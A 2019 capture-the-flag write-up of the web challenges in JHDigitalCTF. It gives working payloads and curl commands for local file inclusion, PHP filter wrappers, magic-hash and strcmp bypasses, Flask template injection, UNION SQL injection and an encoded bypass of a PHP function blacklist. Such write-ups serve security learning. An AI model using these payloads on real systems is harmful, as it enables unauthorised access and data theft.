---
slug: writeup-jhdigital-ctf-web
title: Writeup JHDigitalCTF (John Hammond Digital CTF) 2019 Kategori [WEB]
date: 2019-11-10
year: 2019
author: Bardizba
keywords: [WRITE-UP JHDigitalCTF 2019 Forensics]
description: WRITE-UP JHDigitalCTF 2019 Forensics
excerpt: Writeup JHDigitalCTF (John Hammond Digital CTF) 2019 Kategori [MISC]
tags : ["ctf","jhdctf","web_ctf"]
---

## The Bomb
```
The Bomb
60
Oh no! A bomb is going to go off in this house, only you can stop it!

Connect here: http://jh2i.com:50036.
```

just change the timestamp in detnate_time cookie.using curl :
```bash
curl http://jh2i.com:50036/defuse.php --cookie "detonate_time=1573355244" | grep JHDCTF
```

    Flag = JHDCTF{cookies_can_save_lives}

## Hot Access

```bash
70
Access to all the latest modules, hot off the press! What can you access?

Connect here: http://jh2i.com:50016
```

its a PHP LFI. we can check by setting the m parameter to /etc/passwd.

first, check for .htaccess file by chaning ?m parameter to __.htaccess__
and the content was :
```bash
 <Directory /var/www/html>

	Options Indexes FollowSymLinks MultiViews
	AllowOverride All
	Order allow,deny
	allow from all

 </Directory>

  <Directory /var/www/html/sshh_dont_tell_i_hid_the_flag_here>

	AllowOverride All

 </Directory>%
```

there's __sshh_dont_tell_i_hid_the_flag_here__ directory.

    Flag = JHDCTF{htaccess_can_control_what_you_access}


## &nbsp;
## Magician
```80
Show me a hat trick!

Connect here: http://jh2i.com:50000
```
this is a PHP == comparison vuln. we need a string, and when we check it's md5, it must have md5 value starting with 0e

after some googleing, i found :

    md5('QNKCDZO') 's result is 0e830400451993494058024219903391

```
Flag = JHDCTF{magic_hashes_make_for_a_good_show}
```

## &nbsp;
## PHPJuggler
```
80
PHP is here to entertain again! They’ve shown you magic tricks, disappearing acts, and now… juggling!

Connect here: http://jh2i.com:50030.
```

it's strcmp php's problem. we just need to change the parameter to array since strcmp can't compare array with string

```bash
curl -X POST http://jh2i.com:50030/ --data "flag[]" | grep JHDCTF

flag = JHDCTF{php_dropped_the_ball_again}
```


## &nbsp;
## GLHF
```90
LMFAO! FLAG PLZ, THX!

Connect here: http://jh2i.com:50014
```

its PHP LFI **AGAIN**! there's file FLAG on the server but it's seems the flag is hidden there.
for this problem, we can use php:// wrapper

payload
```bash
php://filter/convert.base64-encode/resource=FLAG
```
and we decode it,
```bash
curl http://jh2i.com:50014/index.php\?page\=php://filter/convert.base64-encode/resource\=FLAG | base64 --d

Flag = JHDCTF{lmfao_php_filters_ftw!!!}
```

## &nbsp;
## JaWT
```
90
Check the admin's scratchpad!

Connect here: http://jh2i.com:50019//
```

it's jwt challenge. first change the jwt cookie to whatever you want. the idea is to broke the app and show it's error. 
after the page show it's errors,**VOILA!!** we just found the flag.
![JaWT](./writeup-jhdigital-ctf/pics/jawt.png)

    Flag = JHDCTF{jawt_was_just_what_you_thought}

## &nbsp;
## MASK
```
90
Take off your mask.

Connect here: http://jh2i.com:50023.
```
this is Flask Template injection, we can make it sure by typing {{1+1}} on the input it show "2".

we can use this payload to read the app code.
```bash
{{ ''.__class__.__mro__[2].__subclasses__()[40]('server.py').read() }}
```

and it returns :
```python
 #!/usr/bin/env python

import flask
from flask import request, render_template_string


app = flask.Flask(__name__)
app.config.from_object(__name__)
app.secret_key = 'JHDCTF{server_side_template_injection_unmasked}'


@app.route('/', methods = ["GET", "POST"])
def index(): 

	mask = "... you have not yet taken off your mask!"

	if request.method == "POST":
		mask = request.form['mask']
	
	return flask.render_template_string(  ''' {%  extends "layout.html"  %}
	{%  block body  %} ''' + mask + ''' {%  endblock %} ''' )

if ( __name__ == "__main__" ):

	app.run( debug=True, host='0.0.0.0' ) 
```

    Flag = JHDCTF{server_side_template_injection_unmasked}


## &nbsp;
## 10 Character Web Shell
```
100
Only 10 char--

Connect here: http://jh2i.com:50001.
```

it's a webshell that do __exec__ to _c_ parameter.
check using ls -lah to see directory listing
![dirlist](./writeup-jhdigital-ctf/pics/dirlis.png)

i think the flag is located in __e61f406b1ff39023a375efe891f20c57__ directory.
since the c parameter length can't be 10 or more.
we can use cat with wildcard parameter.

payload :
```bash
cat e*/*

Flag = JHDCTF{you_really_can_see_in_the_dark}
```

## Sequelitis
```bash
100
Sequelitis has moved to a new database for keeping track of their customers. Break in.

Connect here: http://jh2i.com:50034.
```

its SQL Injection problem, we can use UNION for this problem.
```bash
curl -X POST http://jh2i.com:50034/ --data "first_name=' OR false UNION SELECT table_schema, table_name,2 FROM information_schema.tables-- -"
```
and the result from command with payload above is there's 2 table :
    1. customer
    2. flag

    payload = first_name=' OR false UNION SELECT *,1,2 from flag limit 0,1-- -

```html
curl -X POST http://jh2i.com:50034/ --data "first_name=' OR false UNION SELECT *,1,2 from flag limit 0,1-- -"

<html>
 <head>
 </head>
 <body>
 <h1>Sequelitis</h1>

<h3> Customer Query </h3>

<form method="POST" action="#">

	<p>
	First Name:
	</p>
	<p>
		<input type="text" name="first_name" placeholder="John">
	</p>
	<p><input type="submit" value="Submit"></p>

</form>

<hr> <!-- ..................................................... -->

<h3> Results </h3>

<pre>
Customers returned are:

JHDCTF{explicit_sqli_is_how_sql_will_die 1: 2

</pre>
</body>
</html>%
```

    Flag = JHDCTF{explicit_sqli_is_how_sql_will_die}

## nbsp;
## GET Encoded
```
125
I don't GET this%21 Do you%3F

Connect here: http://jh2i.com:50013
```

it's PHP Code Injection Filter Bypass. 
since the challs title is **GET ENCODED* so i try do url-encoding on __system__ it's become :
    
    %73%79%73%74%65%6d #system

```html
curl http://jh2i.com:50013/\?%73%79%73%74%65%6d                                                             0|1 ↵
<pre><br />
<b>Warning</b>:  system(): Cannot execute a blank command in <b>/var/www/html/index.php</b> on line <b>33</b><br />
</pre><p>Machines hunt for more than humans do.</p>%
```

and it works!!,

```bash
curl http://jh2i.com:50013/\?%73%79%73%74%65%6d\=cat%20\*                                                       ✔
<pre>// the flag is: JHDCTF{i_gotcha_url_encoding}<?php

	function debug(){
		highlight_file(__FILE__);

	}


	// I hate these functions, they are so insecure!
	$blacklist = "assert|system|passthru|exec|assert|read|open|eval|`|_|file|dir|\.\.|\/\/|curl|ftp|glob";


	// If you supply GET arguments, process them...
	// Documentation here: http://php.net/manual/en/reserved.variables.get.php
	if ( count( $_GET ) > 0 ){

		// Check if there are any bad functions in the URL supplied
		if ( preg_match( "/$blacklist/i", $_SERVER['REQUEST_URI'] ) ) {

			// If there are all, kindly tell them off. ;)
			// Documentation here: http://php.net/manual/en/reserved.variables.server.php
			die( "Go away, hacker! No unsafe functions in \$_SERVER['REQUEST_URI']!!" );

		}else{

			// Otherwise, execute code as a usual debugging interface.
			// Pull them out of the GET array as `variable=value` format...
			list( $function, $argument ) = each($_GET);

			// and call what they supply...
			// THIS WILL ONLY CALL ONE FUNCTION, SO YOU CAN'T INCLUDE `/?debug`
			echo("<pre>");
			$function($argument);
			echo("</pre>");
		}

	}

	echo("<p>Machines hunt for more than humans do.</p>");


?>
# you know the way my queen
User-Agent: *
Disallow: /?debug</pre><p>Machines hunt for more than humans do.</p>%
```

    Flag = JHDCTF{i_gotcha_url_encoding}

## &nbsp;
##
